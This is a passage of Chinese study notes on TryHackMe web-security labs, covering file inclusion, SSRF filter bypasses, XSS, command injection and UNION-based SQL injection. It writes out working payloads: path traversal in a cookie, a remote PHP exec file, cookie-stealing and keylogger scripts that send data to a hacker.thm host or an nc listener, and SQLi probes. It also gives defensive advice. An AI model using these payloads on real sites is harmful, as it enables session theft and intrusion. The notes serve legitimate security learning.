+<li>关闭PHP错误以避免泄露应用程序的路径和其他可能泄露的信息。</li>
+<li>Web 应用程序防火墙 (WAF) 是帮助缓解 Web 应用程序攻击的好选择。</li>
+<li>如果您的 Web 应用程序不需要某些导致文件包含漏洞的PHP功能，请禁用它们，例如allow_url_fopen on 和allow_url_include。</li>
+<li>仔细分析 Web 应用程序，只允许需要的协议和PHP包装器。</li>
+<li>永远不要相信用户输入，并确保针对文件包含实施正确的输入验证。</li>
+<li>对文件名和位置实施白名单以及黑名单。<h5 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h5><img src="https://s2.loli.net/2022/05/18/ksM7VhcR3pzZGQn.png" alt="202205181148084.png"><h5 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h5>只有管理人员才能访问<br><img src="https://s2.loli.net/2022/05/18/BXIWyAOm9DbL4au.png" alt="202205181148085.png"><br>抓包发现cookie设置是guest 可以直接修改成admins<br><img src="https://s2.loli.net/2022/05/18/r95kbTYs8P6A7uQ.png" alt="202205181148086.png"><br>修改admins后访问成功，但是不知道文件包含的参数是什么<br>传的唯一一个参数在这里，修改cookie为..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 他还给了.php %00截断<br><code>payload：Cookie: THM=../../../../etc/flag2%00</code><br><img src="https://s2.loli.net/2022/05/18/zoTHE9yd5UtWNqQ.png" alt="202205181148087.png"><h5 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h5><img src="https://s2.loli.net/2022/05/18/MOrK8YLk9qNFwRy.png" alt="202205181148088.png"><br>包含welcome可以<br>&#x2F;etc&#x2F;passwd报错<br>双写没用，抓包改post发送依然是有.php的后缀，%00截断获取成功<br><img src="https://s2.loli.net/2022/05/18/bLgtx8Fj1wGhWlp.png" alt="202205181148089.png"></li>
+</ul>
+<p>远程文件包含<br>题目要求执行hostname<br>kali创建一个cmd.txt文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">print</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;hostname&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>python开一个http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9001</span><br></pre></td></tr></table></figure>
+<p>直接访问就行了<br><img src="https://s2.loli.net/2022/05/18/FNezQ71arRS6WoD.png" alt="202205181148090.png"></p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>简介：服务器端请求伪造。这是一个允许恶意用户使网络服务器向攻击者选择的资源发出附加或编辑的HTTP<br>请求的漏洞。</p>
+<p>类型：常规SSRF，盲blindSSRF</p>
+<p>影响：</p>
+<ul>
+<li>进入未经授权的区域。</li>
+<li>访问客户&#x2F;组织数据。</li>
+<li>能够扩展到内部网络。</li>
+<li>显示身份验证令牌&#x2F;凭据。</li>
+</ul>
+<p>例子<br><img src="https://s2.loli.net/2022/05/18/fYegmZlxk8a3c6h.png" alt="202205181148091.png"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://website.thm/item/2?server=api 要我们访问 https://server.website.thm/flag?id=9 </span><br><span class="line">在后面输入server.website.thm/flag?id=9因为是挤掉后面的地址，还要让他不执行，所以加一个&amp;x=这个假参数让他把后面的地址当参数 </span><br><span class="line">原解释： &amp;x=结尾的有效负载用于阻止将剩余路径附加到攻击者的URL末尾，而是将其转换为查询字符串的参数(?x=)。  </span><br><span class="line">最终访问地址： </span><br><span class="line">Server Requesting: </span><br><span class="line">https://server.website.thm/flag?id=9&amp;qweqw=.website.thm/api/item?id=2</span><br></pre></td></tr></table></figure>
+<p>可以通过多种不同方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：</p>
+<p>寻找SSRF<br>在地址栏中的参数中使用完整 URL 时：<br><img src="https://s2.loli.net/2022/05/18/RMJ93oOqLF2ev1Y.png" alt="202205181148095.png"><br>表单中的隐藏字段：<br><img src="https://s2.loli.net/2022/05/18/95BtT2vxw6rXaRf.png" alt="202205181148092.png"><br>部分 URL，例如主机名：<br><img src="https://s2.loli.net/2022/05/18/RMJ93oOqLF2ev1Y.png" alt="202205181148095.png"><br>或者也许只有 URL 的路径：<br><img src="https://s2.loli.net/2022/05/18/TYZFE7cjs5CmoJV.png" alt="202205181148093.png"></p>
+<p>其中一些示例比其他示例更容易利用，这就是需要大量试验和错误才能找到有效负载的地方。</p>
+<p>如果使用不向您反映任何输出的盲 SSRF，您将需要使用外部HTTP日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的 Collaborator 客户端。</p>
+<h4 id="常见的SSRF防御绕过"><a href="#常见的SSRF防御绕过" class="headerlink" title="常见的SSRF防御绕过"></a>常见的SSRF防御绕过</h4><ul>
+<li>黑名单和白名单 打开重定向</li>
+</ul>
+<p>黑名单的绕过<br>Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍然允许访问其他位置。</p>
+<ol>
+<li>Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍然允许访问其他位置。</li>
+<li>限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名将出现在拒绝列表中。</li>
+<li>攻击者可以通过使用替代本地主机引用（例如 0、0.0.0.0、0000、127.1、127.<em>.</em>.*、2130706433、017700000001）或具有解析为 IP 地址 127.0.0.1 的DNS</li>
+<li>记录的子域来绕过拒绝列表例如 127.0.0.1.nip.io。</li>
+</ol>
+<p>白名单绕过</p>
+<p>允许列表是所有请求都被拒绝的地方，除非它们出现在列表中或匹配特定模式，例如参数中使用的 URL 必须以 <a target="_blank" rel="noopener" href="https://website.thm/">https://website.thm</a> 开头的规则。  攻击者可以通过在攻击者的域名上创建子域来快速规避此规则，例如 <a target="_blank" rel="noopener" href="https://website.thm.attackers-domain.thm./">https://website.thm.attackers-domain.thm。</a> 应用程序逻辑现在将允许此输入并让攻击者控制内部HTTP 请求。 即：原域名上创建子域名绕过</p>
+<p>打开重定向</p>
+<p>如果上述绕过方法不起作用，攻击者还可以使用另一种技巧，即开放重定向。开放式重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。<br>以链接 <a target="_blank" rel="noopener" href="https://website.thm/link?url=https://tryhackme.com">https://website.thm/link?url=https://tryhackme.com</a> 为例。 创建此端点是为了记录访问者出于广告&#x2F;营销目的而单击此链接的次数。 但是想象一下，有一个潜在的 SSRF 漏洞，它具有严格的规则，只允许以 <a target="_blank" rel="noopener" href="https://website.thm/">https://website.thm/</a> 开头的 URL。 攻击者可以利用上述功能将内部HTTP 请求重定向到攻击者选择的域。</p>
+<p>案例<br>更新头像的地方，查看源代码<br><img src="https://s2.loli.net/2022/05/18/KV8L7cXI6ESqBxt.png" alt="202205181148096.png"><br>随便点一个头像可以看到单选的那个小圆点每一个地址对应一个上面的图片地址，这里就有ssrf漏洞<br><img src="https://s2.loli.net/2022/05/18/dJQztwCHFgXE5eZ.png" alt="202205181148097.png"><br>把地址改为靶场要我们访问的地址点击更新头像<br><img src="https://s2.loli.net/2022/05/18/OQuMZ5Xh4PRy3Cn.png" alt="202205181148098.png"></p>
+<p>头像更新成功，解密当前flag<br><img src="https://s2.loli.net/2022/05/18/Xnpwv1cRzMlS6LY.png" alt="202205181148099.png"></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>简介：<br>在 XSS 中，payload 是我们希望在目标计算机上执行的 JavaScript 代码。有效载荷有两个部分，意图和修改。</p>
+<p>概念证明：<br>这是最简单的有效负载，您要做的就是证明您可以在网站上实现 XSS。这通常是通过在页面上弹出一个带有文本字符串的警告框来完成的，例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>会话窃取：</p>
+<p>用户会话的详细信息，例如登录令牌，通常保存在目标机器上的 cookie 中。下面的 JavaScript 获取目标的 cookie，base64 对 cookie 进行编码以确保传输成功，然后将其发布到黑客控制的网站进行登录。一旦黑客拥有了这些 cookie，他们就可以接管目标的会话并以该用户的身份登录。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;https://hacker.thm/steal?cookie=&#x27;</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>按键记录器：</p>
+<p>下面的代码充当键盘记录器。这意味着您在网页上键入的任何内容都将被转发到黑客控制下的网站。如果网站负载安装在接受的用户登录或信用卡详细信息上，这可能会非常有害。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="title function_">fetch</span>(<span class="string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>商业逻辑：</p>
+<p>这个有效载荷比上面的例子要具体得多。这将是关于调用特定的网络资源或 JavaScript 函数。例如，想象一个用于更改用户电子邮件地址的 JavaScript 函数，名为user.changeEmail(). 您的有效载荷可能如下所示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.<span class="title function_">changeEmail</span>(<span class="string">&#x27;attacker@hacker.thm&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>现在帐户的电子邮件地址已更改，攻击者可能会执行重置密码攻击。</p>
+<h4 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h4><p>当HTTP请求中的用户提供的数据未经任何验证包含在网页源中时，就会发生反射型 XSS 。<br>示例场景：</p>
+<p>一个网站，如果您输入错误的输入，则会显示错误消息。错误消息的内容取自查询字符串中的错误参数，并直接构建到页面源中。<br><img src="https://s2.loli.net/2022/05/18/a8ZGSUFeQ24YpE9.png" alt="202205181148100.png"></p>
+<p>应用程序不检查错误参数的内容，从而允许攻击者插入恶意代码。<br><img src="https://s2.loli.net/2022/05/18/piZaGKwtobqs7WI.png" alt="202205181148101.png"></p>
+<p>潜在影响：</p>
+<p>攻击者可以向潜在受害者发送链接或将其嵌入到包含 JavaScript 有效负载的另一个网站上的 iframe 中，让他们在浏览器上执行代码，从而可能泄露会话或客户信息。</p>
+<p>如何测试反射型 XSS：</p>
+<p>您需要测试每个可能的入口点；这些包括：</p>
+<ul>
+<li>URL 查询字符串中的参数</li>
+<li>URL 文件路径</li>
+<li>有时HTTP标头（尽管在实践中不太可能被利用）<br>当HTTP请求中的用户提供的数据未经任何验证包含在网页源中时，就会发生反射型 XSS 。</li>
+</ul>
+<p>示例场景：</p>
+<p>一个网站，如果您输入错误的输入，则会显示错误消息。错误消息的内容取自查询字符串中的错误参数，并直接构建到页面源中。<br><img src="https://s2.loli.net/2022/05/18/a8ZGSUFeQ24YpE9.png" alt="202205181148100.png"></p>
+<p>应用程序不检查错误参数的内容，从而允许攻击者插入恶意代码。<br><img src="https://s2.loli.net/2022/05/18/piZaGKwtobqs7WI.png" alt="202205181148101.png"></p>
+<p>潜在影响：</p>
+<p>攻击者可以向潜在受害者发送链接或将其嵌入到包含 JavaScript 有效负载的另一个网站上的 iframe 中，让他们在浏览器上执行代码，从而可能泄露会话或客户信息。</p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>顾名思义，XSS 有效负载存储在 Web 应用程序中（例如，在数据库中），然后在其他用户访问该站点或网页时运行。</p>
+<p>示例场景：</p>
+<p>允许用户发表评论的博客网站。</p>
+<p>不幸的是，不会检查这些评论是否包含 JavaScript 或过滤掉任何恶意代码。</p>
+<p>如果我们现在发布包含 JavaScript 的评论，这将存储在数据库中，并且现在访问该文章的每个其他用户都将在他们的浏览器中运行 JavaScript。<br>潜在影响：</p>
+<p>恶意 JavaScript 可能会将用户重定向到另一个站点、窃取用户的会话 cookie 或在充当访问用户时执行其他网站操作。</p>
+<p>如何测试存储型 XSS：</p>
+<p>您需要测试似乎存储数据的每个可能的入口点，然后在其他用户可以访问的区域中显示出来；其中一个小例子可能是：</p>
+<ul>
+<li>对博客的评论</li>
+<li>用户个人资料信息</li>
+<li>网站列表</li>
+</ul>
+<p>有时开发人员认为在客户端限制输入值是足够好的保护，因此将值更改为 Web 应用程序不期望的值是发现存储的 XSS 的一个很好的来源，例如，期望一个整数的年龄字段一个下拉菜单，但是，您手动发送请求，而不是使用允许您尝试恶意负载的表单。 </p>
+<p>一旦您找到了一些存储在 Web 应用程序中的数据，您就需要确认您可以成功运行您的 JavaScript 有效负载；</p>
+<p>您的有效负载将取决于您的代码在应用程序中的反映位置（您将在任务 6 中了解有关此内容的更多信息）。</p>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM代表文档对象模型，是HTML和 XML 文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，该文档既可以显示在浏览器窗口中，也可以作为 HTML 源代码显示。HTML DOM 的示意图如下所示：<br><img src="https://s2.loli.net/2022/05/18/yLZ5Yp4UGM8JOTg.png" alt="202205181148104.png"><br>利用 DOM</p>
+<p>基于 DOM 的 XSS 是 JavaScript 直接在浏览器中执行的地方，无需加载任何新页面或将数据提交给后端代码。当网站 JavaScript 代码作用于输入或用户交互时，执行发生。</p>
+<p>示例场景：</p>
+<p>网站的 JavaScript 从<strong>window.location.hash</strong> 参数中获取内容，然后将其写入当前正在查看的页面中的部分。哈希的内容不会检查恶意代码，从而允许攻击者将他们选择的 JavaScript 注入网页。</p>
+<p>潜在影响：</p>
+<p>精心制作的链接可能会发送给潜在受害者，将他们重定向到另一个网站或从页面或用户会话中窃取内容。</p>
+<p>如何测试基于 Dom 的 XSS：</p>
+<p>基于 DOM 的 XSS 可能难以测试，并且需要一定的 JavaScript 知识才能阅读源代码。您需要查找访问攻击者可以控制的某些变量的代码部分，例如“ <strong>window.location.x</strong> ”参数。</p>
+<p>找到这些代码后，您需要查看它们是如何处理的，以及这些值是否曾经写入网页的 DOM 或传递给不安全的 JavaScript 方法，例如**eval()**。<br>实例：<br>级别一：<br>您会看到一个表格，要求您输入您的姓名，一旦您输入了您的姓名，它将显示在下面的一行中，<br><img src="https://s2.loli.net/2022/05/18/JoezwcamEAtZW9L.png" alt="202205181148105.png"></p>
+<p>二级<br><img src="https://s2.loli.net/2022/05/18/8J23wb7fKUQMnHq.png" alt="202205181148106.png"><br>三级<br><img src="https://s2.loli.net/2022/05/18/gq871wnLQkaJMDN.png" alt="202205181148107.png"><br>四级<br><img src="https://s2.loli.net/2022/05/18/yVHwj4Tv2BY8gxq.png" alt="202205181148108.png"><br>五级<br><img src="https://s2.loli.net/2022/05/18/pKlxBDm1QV8Nsvh.png" alt="202205181148109.png"><br>六级<br><img src="https://s2.loli.net/2022/05/18/tN5nRugP6foG3Sq.png" alt="202205181148110.png"><br>多语种</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jaVasCript</span>:<span class="comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="comment">/* */</span>onerror=<span class="title function_">alert</span>(<span class="string">&#x27;THM&#x27;</span>) )<span class="comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span></span><br></pre></td></tr></table></figure>
+<p>实例：盲XSS</p>
+<p>创建一个支持票<br><img src="https://s2.loli.net/2022/05/18/wVaErNlxn5qckKS.png" alt="202205181148111.png"></p>
+<p>绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(&#x27;thm&#x27;);&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p>打cookie</p>
+<p>开一个http服务<br><code>nc -lvnp 9001</code><br>重新创建一个</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;fetch(&#x27;http:/</span><span class="regexp">/开nc的ip+端口?cookie=&#x27; + btoa(document.cookie) );&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后cookie就发过来了<br><img src="https://s2.loli.net/2022/05/18/xD4ptozHAN5VBeh.png" alt="202205181148112.png"></p>
+<h3 id="命令注入RCE"><a href="#命令注入RCE" class="headerlink" title="命令注入RCE"></a>命令注入RCE</h3><p>首先，让我们先了解一下什么是命令注入。命令注入是滥用应用程序的行为在操作系统上执行命令，使用与设备上的应用程序运行相同的权限。例如，在以名为的用户身份运行的 Web 服务器上实现命令注入joe将在该用户下执行命令joe- 并因此获得joe具有的任何权限。</p>
+<p>命令注入漏洞也称为“远程代码执行”(RCE)，因为攻击者可以欺骗应用程序执行他们提供的一系列有效负载，而无需直接访问机器本身（即交互式外壳）。网络服务器将处理此代码并在运行该应用程序的用户的权限和访问控制下执行它。  </p>
+<p>命令注入通常也被称为“远程代码执行”（RCE），因为它能够在应用程序中远程执行代码。这些漏洞通常对攻击者来说是最有利可图的，因为这意味着攻击者可以直接与易受攻击的系统进行交互。例如，攻击者可能会读取系统或用户文件、数据和类似性质的东西。</p>
+<p>之所以存在此漏洞，是因为应用程序经常使用PHP、Python 和 NodeJS 等编程语言中的函数将数据传递给机器的操作系统并在机器的操作系统上进行系统调用。例如，从字段中获取输入并在文件中搜索条目。以下面这段代码片段为例：</p>
+<p>在此代码片段中，应用程序获取用户在名为的输入字段中输入的数据$title在目录中搜索歌曲名称。让我们将其分解为几个简单的步骤。<br><img src="https://s2.loli.net/2022/05/18/235lks1KJOScqW7.png" alt="202205181148113.png"></p>
+<ol>
+<li><p>应用程序将 MP3 文件存储在操作系统中包含的目录中。</p>
+</li>
+<li><p>用户输入他们想要搜索的歌曲名称。应用程序将此输入存储到$title变量中。</p>
+</li>
+<li><p>该$title变量中的数据被传递给命令grep以搜索名为songtitle 的文本文件。txt用于输入用户希望搜索的任何内容。</p>
+</li>
+<li><p>本次歌名搜索的输出。txt将确定应用程序是否通知用户歌曲存在与否。</p>
+</li>
+</ol>
+<p>现在，这类信息通常会存储在数据库中；然而，这只是应用程序从用户那里获取输入以与应用程序的操作系统交互的示例。</p>
+<p>攻击者可以通过注入他们自己的命令让应用程序执行来滥用此应用程序。他们可以要求应用程序从更敏感的文件中读取数据，而不是grep用于搜索 中的条目。songtitle.txt</p>
+<p>无论应用程序使用何种编程语言，都可能以这种方式滥用应用程序。只要应用程序处理并执行它，就会导致命令注入。例如，下面的这段代码片段是一个用 Python 编写的应用程序。<br><img src="https://s2.loli.net/2022/05/18/VT32QngErKPDHOo.png" alt="202205181148114.png"><br>请注意，您不需要了解这些应用程序背后的语法。但是，出于某种原因，我已经概述了这个 Python 应用程序如何工作的步骤。</p>
+<ul>
+<li>“flask” 包用于设置 Web 服务器</li>
+<li>使用“子进程”包在设备上执行命令的函数</li>
+<li>我们在网络服务器中使用一个路由来执行所提供的任何内容。例如，要执行whoami，我们需要访问 <a target="_blank" rel="noopener" href="http://flaskapp.thm/whoami">http://flaskapp.thm/whoami</a><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5>盲RCE</li>
+</ul>
+<p>RCE</p>
+<p>检测盲命令注入</p>
+<p>盲注是指发生命令注入；但是，没有可见的输出，因此不会立即引起注意。例如，执行了一个命令，但 Web 应用程序没有输出任何消息。</p>
+<p>对于这种类型的命令注入，我们将需要使用会导致一些时间延迟的有效负载。例如，pingandsleep命令是重要的测试负载。举个例子，与您指定的ping 次数有关，应用ping程序将挂起x秒。</p>
+<p>另一种检测盲命令注入的方法是强制输出。这可以通过使用重定向运算符来完成，例如&gt;. 如果您对此不熟悉，我建议您查看<a target="_blank" rel="noopener" href="https://tryhackme.com/module/linux-fundamentals">Linux 基础模块</a>。例如，我们可以告诉 Web 应用程序执行命令，例如whoami并将其重定向到文件。然后我们可以使用一个命令cat来读取这个新创建的文件的内容。</p>
+<p>以这种方式测试命令注入通常很复杂，并且需要大量的实验，特别是因为命令的语法在 Linux 和 Windows 之间有所不同。</p>
+<p>该curl 命令是测试命令注入的好方法。这是因为您可以使用curl 有效负载中的应用程序向和从应用程序传递数据。以下面的代码片段为例，一个简单的 curl 有效负载到应用程序是可能的命令注入。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami</span><br></pre></td></tr></table></figure>
+<p>检测详细命令注入</p>
+<p>以这种方式检测命令注入可以说是两者中最简单的方法。详细命令注入是指应用程序向您提供有关正在发生或正在执行的事情的反馈或输出。<br>例如，ping或等命令的输出whoami直接显示在 Web 应用程序上。</p>
+<p>有用的有效载荷<br>我已经为Linux和 Windows 编译了一些有价值的有效载荷到下表中。</p>
+<p> Linux</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>whoami</td>
+<td>查看应用程序在哪个用户下运行。</td>
+</tr>
+<tr>
+<td>ls</td>
+<td>列出当前目录的内容。您可能能够找到诸如配置文件、环境文件（令牌和应用程序密钥）之类的文件以及更多有价值的东西。</td>
+</tr>
+<tr>
+<td>ping</td>
+<td>此命令将调用应用程序挂起。这对于测试盲命令注入的应用程序很有用。</td>
+</tr>
+<tr>
+<td>sleep</td>
+<td>这是另一个有用的有效载荷，用于测试未ping安装机器的盲命令注入应用程序。</td>
+</tr>
+<tr>
+<td>nc</td>
+<td>Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航以获取其他服务、文件或提升权限的潜在方法。</td>
+</tr>
+</tbody></table>
+<p>Windows</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>whoami</td>
+<td>查看应用程序在哪个用户下运行。</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>列出当前目录的内容。您可能能够找到诸如配置文件、环境文件（令牌和应用程序密钥）之类的文件以及更多有价值的东西。</td>
+</tr>
+<tr>
+<td>ping</td>
+<td>此命令将调用应用程序挂起。这对于测试盲命令注入的应用程序很有用。</td>
+</tr>
+<tr>
+<td>timeout</td>
+<td>此命令还将调用应用程序挂起。ping如果未安装命令，它对于测试应用程序的盲注命令也很有用。</td>
+</tr>
+<tr>
+<td>修复</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>可以通过多种方式防止命令注入。从最小化使用编程语言中潜在危险的函数或库到过滤输入而不依赖用户输入的一切。我在下面详细介绍了这些。下面的例子是PHP编程语言；但是，相同的原则可以扩展到许多其他语言。</p>
+<p>在PHP中，许多函数与操作系统交互以通过 shell 执行命令；这些包括：</p>
+<ul>
+<li>Exec</li>
+<li>Passthru</li>
+<li>System</li>
+</ul>
+<p>以下面的这个片段为例。在这里，应用程序将只接受和处理输入到表单中的数字。这意味着whoami不会处理诸如此类的任何命令。<br><img src="https://s2.loli.net/2022/05/18/yBmale1RbiWnt6s.png" alt="202205181148115.png"></p>
+<ol>
+<li>该应用程序将仅接受特定模式的字符（数字 0-9）</li>
+<li>然后，应用程序将只继续执行这些全是数字的数据。</li>
+</ol>
+<p>这些函数接受字符串或用户数据等输入，并将执行系统上提供的任何内容。任何使用这些功能而没有经过适当检查的应用程序都容易受到命令注入的攻击。</p>
+<p>输入消毒</p>
+<p>清理应用程序使用的用户输入是防止命令注入的好方法。这是一个指定用户可以提交的数据格式或类型的过程。例如，仅接受数字数据或删除任何特殊字符（如&#x3D;&#x3D;&gt;&#x3D;&#x3D;、  &#x3D;&#x3D;&amp;&#x3D;&#x3D;和）的输入字段&#x2F;。</p>
+<p>在下面的代码片段中，<strong>filter_input</strong> <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.filter-input.php">PHP 函数</a>用于检查通过输入表单提交的任何数据是否为数字。如果不是数字，则一定是无效输入。<br><img src="https://s2.loli.net/2022/05/18/mIvZVpCFuX5LDy8.png" alt="202205181148116.png"></p>
+<p>绕过过滤器</p>
+<p>应用程序将采用多种技术来过滤和清理从用户输入中获取的数据。这些过滤器会将您限制为特定的有效负载；但是，我们可以滥用应用程序背后的逻辑来绕过这些过滤器。例如，应用程序可能会去掉引号；我们可以改为使用它的十六进制值来获得相同的结果。</p>
+<p>执行时，尽管给出的数据格式与预期的不同，但仍可以对其进行解释并获得相同的结果。<br><img src="https://s2.loli.net/2022/05/18/somCEOyDhMtvJ5G.png" alt="202205181148117.png"></p>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p><img src="https://s2.loli.net/2022/05/18/Epx28m963WrXNTC.png" alt="202205181148118.png"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a>    RCE查阅表</p>
+</blockquote>
+<h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><p>SQL（结构化查询语言）注入，通常称为 SQLi，是一种对 Web 应用程序数据库服务器的攻击，会导致执行恶意查询。当 Web 应用程序使用未经正确验的用户输入与数据库通信时，攻击者可能会窃取、删除或更改私人和客户数据，并将 Web 应用程序身份验证方法攻击为私有或客户区。这就是为什么 SQLi 是最古老的 Web 应用程序漏洞之一，它也可能是最具破坏性的。</p>
+<h4 id="带内注入"><a href="#带内注入" class="headerlink" title="带内注入()"></a>带内注入()</h4><p>可以直接看到报错的语句</p>
+<p>练习实验室的第一级包含一个模拟浏览器和一个网站，其中包含一个包含不同文章的博客，可以通过更改查询字符串中的 ID 号来访问这些文章。</p>
+<p>发现基于错误的 SQL 注入的关键是通过尝试某些字符来中断代码的 SQL 查询，直到产生错误消息；这些最常见的是单撇号 ( ‘ ) 或引号 ( “ )。</p>
+<p>尝试在 id&#x3D;1 后输入撇号 (  ‘  ) 并按 Enter。您会看到这会返回一个 SQL 错误，通知您语法中的错误。您收到此错误消息的事实证实了 SQL 注入漏洞的存在。我们现在可以利用此漏洞并使用错误消息来了解有关数据库结构的更多信息。 </p>
+<p>我们需要做的第一件事是在不显示错误消息的情况下向浏览器返回数据。首先，我们将尝试 UNION 运算符，以便我们可以收到我们选择的额外结果。尝试将模拟浏览器 id 参数设置为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>此语句应生成一条错误消息，通知您 UNION SELECT 语句的列数与原始 SELECT 查询不同。所以让我们再试一次，但添加另一列：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>再次出现同样的错误，所以让我们通过添加另一列来重复：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>成功，错误信息消失了，正在显示文章，但是现在我们要显示我们的数据而不是文章。该文章正在显示，因为它在网站代码的某处获取了第一个返回的结果并显示了这一点。为了解决这个问题，我们需要第一个查询不产生任何结果。这可以简单地通过将文章 ID 从 1 更改为 0 来完成。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>您现在将看到这篇文章只是由返回列值 1、2 和 3 的 UNION 选择的结果组成。我们可以开始使用这些返回的值来检索更多有用的信息。首先，我们将获得我们有权访问的数据库名称：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
+
+<p>您现在将看到之前显示数字 3 的位置；它现在显示数据库的名称，即 sqli_one。</p>
